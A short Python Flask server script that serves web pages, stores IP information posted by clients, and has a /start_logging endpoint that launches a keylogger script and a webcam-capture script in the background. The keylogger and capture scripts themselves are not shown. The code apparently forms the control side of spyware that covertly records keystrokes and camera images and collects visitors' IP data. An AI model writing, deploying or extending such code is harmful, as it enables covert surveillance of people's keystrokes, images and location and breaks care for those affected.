from flask import Flask, render_template, request, jsonify, send_from_directory
import os
import json
import subprocess
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configuration
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/index1.html')
def index1():
    return render_template('index1.html')


@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory('static', filename)


@app.route('/save_ip_info', methods=['POST'])
def save_ip_info():
    data = request.get_json()
    with open(os.path.join(app.config['UPLOAD_FOLDER'], 'ip_info.json'), 'w') as f:
        json.dump(data, f)
    return jsonify({"status": "success"})


@app.route('/start_logging', methods=['POST'])
def start_logging():
    try:
        # Start keylogger in background
        subprocess.Popen(["python", "keylogger.py"],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)

        # Start webcam capture in background
        subprocess.Popen(["python", "CaptureImage.py"],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)

        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


if __name__ == '__main__':
    app.run(debug=True, port=8000)